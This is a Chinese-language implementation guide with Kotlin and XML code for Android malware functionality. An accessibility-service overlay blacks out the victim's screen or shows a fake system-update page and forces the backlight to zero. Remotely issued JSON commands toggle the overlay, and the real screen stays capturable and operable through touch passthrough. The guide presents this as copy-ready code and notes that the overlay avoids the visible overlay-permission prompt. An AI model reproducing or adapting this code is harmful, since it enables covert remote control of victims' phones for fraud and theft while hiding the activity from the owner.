# 黑屏 + 半透明中控（核心实现说明）

> 场景：手机端给用户看是「黑屏／系统更新中」，同时面板（中控）能透出桌面或显示半透明控制层，
> 截图/投屏仍能拍到真实画面。本文只给核心代码与关键参数，照抄即可。

---

## 一、原理先讲清楚（三件事别混）

| 目标 | 手段 | 关键点 |
|---|---|---|
| **手机端黑屏** | 全屏黑色浮层 + 把背光压到 0 | 浮层用 `TYPE_ACCESSIBILITY_OVERLAY(2032)`，**不用** `SYSTEM_ALERT_WINDOW` |
| **中控半透明** | 同一个浮层给 `alpha` / 背景色带透明度 | 2032 + `PixelFormat.TRANSLUCENT`，`root.alpha = 254/255` 之类 |
| **截图仍能看到内容** | 截图读的是帧缓冲，和背光无关 | 背光只影响人眼；压亮度后 `screencap` 照样有画面 |

**为什么不用 Activity 当遮罩**：一按 HOME 就回桌面了，Activity 会消失；2032 浮层不会。
**为什么不申请悬浮窗权限**：2032 是「无障碍浮层」，权限随无障碍服务一起给，不出现在授权列表。

---

## 二、清单与无障碍配置

`AndroidManifest.xml`

```xml
<!-- 压背光需要（Android 6+ 是特殊权限，要引导用户去设置里开） -->
<uses-permission android:name="android.permission.WRITE_SETTINGS"
    tools:ignore="ProtectedPermissions" />

<service
    android:name=".accessibility.MyAccessibilityService"
    android:exported="true"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config" />
</service>
```

`res/xml/accessibility_service_config.xml`

```xml
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged|typeWindowsChanged"
    android:accessibilityFlags="flagRetrieveInteractiveWindows|flagReportViewIds"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="250"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:canTakeScreenshot="true" />
```

> `canTakeScreenshot` 只有在你要「抓真实帧做上报」时才需要；只做黑屏可以去掉。

---

## 三、黑屏浮层：核心代码

```kotlin
object BlackScreen {
    private const val TAG = "BlackScreen"
    private var view: android.view.View? = null
    private var savedBrightness = -1
    private var saveModeAuto = 0

    /**
     * @param mode       lockNormal（纯黑）/ lockUpdate（黑+压亮度）/ lockAndroidUpdate（黑+假更新页）
     * @param alpha      遮罩不透明度 0.30~1.0；纯黑用 254/255，半透明中控用 0.65~0.8
     * @param brightness 背光 0.0~1.0（0 = 完全黑）
     */
    fun show(service: AccessibilityService,
             mode: String,
             alpha: Double? = null,
             brightness: Double? = null) {

        // 命令通常来自网络线程，加 WindowManager 视图必须回主线程
        if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) {
            android.os.Handler(android.os.Looper.getMainLooper())
                .post { show(service, mode, alpha, brightness) }
            return
        }

        val maskAlpha = (alpha ?: (254.0 / 255.0)).coerceIn(0.30, 1.0)
        val backlight = (brightness ?: if (mode == "lockNormal") 0.0 else 0.4).coerceIn(0.0, 1.0)

        if (view != null) hide(service)          // 幂等：重复调用先卸旧的
        mount(service, mode, maskAlpha, backlight)
    }

    private fun mount(service: AccessibilityService, mode: String, maskAlpha: Double, backlight: Double) {
        val wm = service.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager

        val lp = android.view.WindowManager.LayoutParams(
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            2032,                                        // TYPE_ACCESSIBILITY_OVERLAY
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or   // ★ 触摸穿透，黑屏也能操作
            android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or  // ★ 防止息屏（息屏后截图全黑）
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            android.graphics.PixelFormat.TRANSLUCENT     // ★ 半透明的前提
        ).apply {
            gravity = android.view.Gravity.TOP or android.view.Gravity.START
            screenBrightness = backlight.toFloat()       // ★ 人眼黑的关键（浮层级亮度）
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    android.view.WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        val scrimA = (maskAlpha * 255).toInt().coerceIn(0, 255)
        val root = android.widget.FrameLayout(service).apply {
            // 纯黑：#fe000000 —— 肉眼全黑，抓帧软件合成时能透出桌面
            setBackgroundColor((scrimA shl 24))          // 只给 ARGB 的 A 通道，RGB=0 即黑
            isClickable = false
        }
        // 要「假系统更新页」就往 root 里塞 WebView；只要纯黑就到此为止
        view = root
        runCatching {
            wm.addView(root, lp)
            dimBacklight(service, true, backlight)        // 再压一次系统背光（部分 ROM 才生效）
        }
    }

    fun hide(service: AccessibilityService) {
        val v = view ?: return
        view = null
        runCatching {
            val wm = service.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
            wm.removeView(v)
        }
        dimBacklight(service, false)                      // 恢复原亮度
    }

    /** 压/恢复系统背光：需要 WRITE_SETTINGS；失败不影响黑屏（浮层亮度已够黑） */
    private fun dimBacklight(ctx: android.content.Context, on: Boolean, level: Double = 0.0): Boolean = runCatching {
        if (!android.provider.Settings.System.canWrite(ctx)) return false
        val cr = ctx.contentResolver
        if (on) {
            savedBrightness = android.provider.Settings.System
                .getInt(cr, android.provider.Settings.System.SCREEN_BRIGHTNESS, 128)
            saveModeAuto = android.provider.Settings.System
                .getInt(cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, 0)
            android.provider.Settings.System.putInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, 0)
            android.provider.Settings.System.putInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS,
                (level.coerceIn(0.0, 1.0) * 255).toInt())
        } else {
            if (savedBrightness >= 0) android.provider.Settings.System.putInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS, savedBrightness)
            android.provider.Settings.System.putInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, saveModeAuto)
        }
        true
    }.getOrDefault(false)
}
```

### 实测坑（三星等 ROM）

```
① 只设浮层的 screenBrightness 有些 ROM 不生效（dumpsys display 仍是自动亮度）
   → 用 Activity 兜底：1x1 透明 Activity，窗口 screenBrightness=0
      （见下一节 BrightnessKeeperActivity）
② 不设 FLAG_KEEP_SCREEN_ON 会息屏，息屏后截图全黑，上报帧就没内容了
③ 想要"半透明中控"就别用 #FF000000，用 alpha 0.65~0.8：
   setBackgroundColor((a shl 24)) 或直接 root.alpha = 0.7f
```

---

## 四、背光兜底：1x1 透明 Activity

```kotlin
class BrightnessKeeperActivity : android.app.Activity() {
    override fun onCreate(state: android.os.Bundle?) {
        super.onCreate(state)
        setContentView(android.view.View(this))
        window.addFlags(
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        )
        window.attributes = window.attributes.apply {
            screenBrightness = pendingBrightness   // 0f
            width = 1; height = 1
        }
    }
    companion object {
        @Volatile var pendingBrightness = 0f
        fun start(ctx: android.content.Context) {
            ctx.startActivity(android.content.Intent(ctx, BrightnessKeeperActivity::class.java)
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK))
        }
    }
}
```

`AndroidManifest.xml` 里声明为透明主题（否则启动会闪白）：

```xml
<activity android:name=".ui.BrightnessKeeperActivity"
    android:exported="false"
    android:excludeFromRecents="true"
    android:launchMode="singleInstance"
    android:theme="@android:style/Theme.Translucent.NoTitleBar" />
```

---

## 五、半透明中控浮层（面板/引导页）

和黑屏同一套机制，只是参数不同：

```kotlin
private const val TYPE_ACCESSIBILITY_OVERLAY = 2032
// LAYOUT_IN_SCREEN | NOT_TOUCHABLE | NOT_FOCUSABLE  = 280
private const val FLAGS = 280

val lp = android.view.WindowManager.LayoutParams(
    realWidth, realHeight + 200,          // 多给 200px 盖住导航栏/刘海
    TYPE_ACCESSIBILITY_OVERLAY,
    FLAGS,
    android.graphics.PixelFormat.TRANSLUCENT
).apply {
    gravity = android.view.Gravity.TOP or android.view.Gravity.START
    layoutInDisplayCutoutMode =
        android.view.WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
}

val wv = android.webkit.WebView(service).apply {
    setBackgroundColor(0)                 // ★ 透明底，否则会白底遮住桌面
    settings.javaScriptEnabled = true
    settings.allowFileAccess = true
}
wm.addView(wv, lp)
```

要点：

```
① setBackgroundColor(0) + PixelFormat.TRANSLUCENT → 页面只有内容区不透明
② FLAG_NOT_TOUCHABLE：浮层不拦触摸，下面的系统页照样能点（引导时很重要）
③ FLAG_NOT_FOCUSABLE：不抢焦点，不会弹输入法
④ 想"再透一点"：webView.setAlpha(0.9f) 或用 CSS 半透明背景
```

---

## 六、面板下发命令（和手机端对应）

```json
// 开黑屏：纯黑
{"action":"blackScreen","data":{"mode":"lockNormal"}}

// 开黑屏：黑 + 压亮度（更像息屏）
{"action":"blackScreen","data":{"mode":"lockUpdate","brightness":0.4}}

// 半透明中控（能看到底图 35%）
{"action":"blackScreen","data":{"mode":"lockUpdate","alpha":0.65,"brightness":0.0}}

// 关黑屏
{"action":"blackScreen","data":{"mode":"unlock"}}
```

手机端分发：

```kotlin
when (action) {
    "blackScreen", "lockScreen", "screenOff" -> {
        val mode = data.optString("mode", "lockNormal")
        if (mode == "unlock" || mode == "off") BlackScreen.hide(service)
        else BlackScreen.show(
            service, mode,
            alpha = if (data.has("alpha")) data.optDouble("alpha") else null,
            brightness = if (data.has("brightness")) data.optDouble("brightness") else null
        )
        channel.send("action_result", org.json.JSONObject()
            .put("action", action).put("success", true).put("mode", mode))
    }
}
```

---

## 七、照着做的最小步骤

```
1. 建一个 AccessibilityService，配置 xml 里 canRetrieveWindowContent=true
2. 抄 BlackScreen.kt（黑屏浮层）+ BrightnessKeeperActivity（背光兜底）
3. 清单加 WRITE_SETTINGS（可选，只为压背光）
4. 服务里 onServiceConnected 保存 service 实例，供浮层使用
5. 命令入口接 blackScreen/lockNormal/lockUpdate/unlock 三个档
6. 注意 FLAG_KEEP_SCREEN_ON（不振屏）+ PixelFormat.TRANSLUCENT（能透明）
```

## 八、常见问题

| 现象 | 原因 | 处理 |
|---|---|---|
| 黑屏后一按 HOME 就回到桌面 | 用了 Activity 当遮罩 | 换 2032 浮层 |
| 浮层挡住了下面的系统页，点不动 | 少了 `FLAG_NOT_TOUCHABLE` | 加上 |
| 半透明没效果，还是全白/全黑 | WebView 没 `setBackgroundColor(0)` 或没用 TRANSLUCENT | 两个都改 |
| 三星上只设浮层亮度不黑 | ROM 忽略浮层亮度 | 加 BrightnessKeeperActivity |
| 息屏后截图是纯黑 | 屏幕真的睡了 | `FLAG_KEEP_SCREEN_ON` |
| 用户看不到"黑"但仍能操作 | 这正是设计（触摸穿透） | 想禁止操作就去掉 NOT_TOUCHABLE |
